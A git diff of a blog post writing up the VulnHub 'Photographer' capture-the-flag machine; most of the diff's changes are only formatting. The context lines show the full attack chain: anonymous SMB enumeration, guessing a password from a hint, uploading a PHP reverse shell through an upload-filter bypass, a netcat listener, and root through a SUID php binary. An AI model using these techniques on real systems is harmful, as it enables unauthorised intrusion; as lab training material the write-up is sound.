@@ -4,7 +4,7 @@ current: post
 cover: 'assets/images/photographer.png'
 navigation: True
 title: Photographer Write Up
-date: 2020-09-04 00:00:00
+date: 2020-09-05 00:00:00
 tags: [vulnhub, ctf, oscp]
 class: post-template
 subclass: 'post'
@@ -20,8 +20,7 @@ Photographer was the last machine I did before I took my OSCP exam so it seemed 
 
 Starting with a Nmap scan lets see what ports are open. I got the IP of the machine by checking the DHCP server on my network. However, I could have used arp-scan to find the IP address.
 
-
-```
+```highlight
 ┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
 └──╼ $nmap -sC -sV -oA nmap/initial 192.168.1.77
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-01 17:54 BST
@@ -69,6 +68,7 @@ Nmap done: 1 IP address (1 host up) scanned in 12.80 seconds
 ```
 
 
+
 The scan reveals 4 ports open, Samba and two web. Based on the HTTP banners it looks to be a Linux Ubuntu machine, Googling apache 2.4.18 ubuntu reveals the OS is probably Ubuntu Xenial 16.04 LTS.
 
 ### Enumeration
@@ -86,8 +86,8 @@ Looking at the exploit, the POST request makes a call to **/admin/**. Going to t
 ![Login](/assets/images/photographer/login.png)
 
 Using smbclient and logging in anonymously shows one share in particular that looks interesting 'sambashare'. 
-<pre>
-```
+
+```highlight
 ┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
 └──╼ $smbclient -L \\\\192.168.1.77\\
 
@@ -115,10 +115,10 @@ Get file wordpress.bkp.zip? y
 getting file \wordpress.bkp.zip of size 13930308 as wordpress.bkp.zip (67013.8 KiloBytes/sec) (average 66362.5 KiloBytes/sec)
 smb: \> 
 ```
-</pre>
+
 Two files are on the share, the first is an email from Agi to Daisa advising the site is ready and the other file appears to be a backup zip of the site.
-<pre>
-```
+
+```highlight
 ┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
 └──╼ $cat mailsent.txt 
 Message-ID: <4129F3CA.2020509@dc.edu>
@@ -138,7 +138,7 @@ Don\'t forget your secret, my babygirl ;)
 ┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
 └──╼ $
 ```
-</pre>
+
 'babygirl' looks to be a hint to the password and I now have 2 users and email addresses:
 
 - Agi Clarence - agi@photographer.com
@@ -152,29 +152,28 @@ I go back to port **8000/admin/** and try them out. I get straight in with **dai
 
 Going back to the exploit from earlier, it looks like I can upload a PHP file by saving the file as .jpg then use Burp to rename it. Im going to try and upload a reverse shell PHP script. If your using Kali or ParrotOS the script can be found in /usr/share/webshells/php/ or downloaded from [pentestmonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell).
 
-<pre>
-```
+
+```highlight
 ┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
 └──╼ $cp /usr/share/webshells/php/php-reverse-shell.php .
 ┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
 └──╼ $mv php-reverse-shell.php shell.php.jpg
 ```
-</pre>
+
 I update the script with my local IP and port details.
-<pre>
-```
+
+```highlight
 $ip = '127.0.0.1';  // CHANGE THIS
 $port = 1234;       // CHANGE THIS
 ```
-</pre>
+
 Start a netcat listener ready to catch the shell.
-<pre>
-```
+
+```highlight
 ┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
 └──╼ $sudo nc -nvlp 443
 listening on [any] 443 ...
 ```
-</pre>
 
 Going back to the admin page I upload the file using 'Import content' and find the PHP file. With Burp open and proxy intercept on I set Burp as a proxy in my browser and select 'Import'.
 
@@ -193,8 +192,8 @@ I have a shell as www-data! First thing I always do is upgrade it to a more stab
 ![Shell](/assets/images/photographer/shell.png)
 
 The first flag can be found in Daisa's user directory.
-<pre>
-```
+
+```highlight
 www-data@photographer:/$ cd home/daisa/
 www-data@photographer:/home/daisa$ ls
 Desktop    Downloads  Pictures  Templates  examples.desktop
@@ -203,7 +202,7 @@ www-data@photographer:/home/daisa$ cat user.txt
 d41d8cd98f00{REDACTED}
 www-data@photographer:/home/daisa$
 ```
-</pre>
+
 
 ### Privilege Escalation
 
@@ -222,9 +221,8 @@ First I will check [GTFOBins](https://gtfobins.github.io), searching PHP.
 ![gtfobins](/assets/images/photographer/phpsuid.png)
 
 Lets give it a go.
-<pre>
 
-```
+```highlight
 www-data@photographer:/tmp$ CMD="/bin/sh"
 www-data@photographer:/tmp$ /usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
 # id
@@ -233,12 +231,11 @@ uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
 root
 #
 ```
-</pre>
 
 We have root! Lets grab the flag.
 
-<pre>
-```
+
+```highlight
 # 
 # cd /root
 # cat proof.txt
@@ -274,6 +271,6 @@ Follow me at: http://v1n1v131r4.com
 d41d8cd98f00{REDACTED}
 #
 ```
-</pre>
+
 
 
